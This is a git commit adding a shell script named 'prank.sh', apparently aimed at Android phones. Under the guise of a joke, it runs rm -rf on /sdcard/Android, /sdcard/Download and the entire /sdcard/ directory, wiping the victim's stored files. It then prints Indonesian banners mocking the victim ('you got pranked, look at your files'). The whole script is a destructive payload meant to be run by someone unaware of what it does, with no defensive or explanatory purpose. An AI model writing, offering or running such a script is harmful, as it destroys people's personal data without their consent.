a928ad6b3615d49a06f9cca0d6cac6c5057a5f80
mrtakil <49750385+mrtakil@users.noreply.github.com>
2019-05-28 20:52:14 +0700

    Add files via upload

---
+++ prank.sh
@@ -0,0 +1,12 @@
+#!/bin/bash
+
+rm -rf /sdcard/Android
+cd
+cd /sdcard
+rm -rf /sdcard/Download
+cd
+rm -rf /sdcard/
+figlet MAMPUS KAU KENA PRANK
+figlet LIAT FILE KAMU!
+figlet KALO ILANG ALHAMDULILLAH
+figlet Script By MrTakil
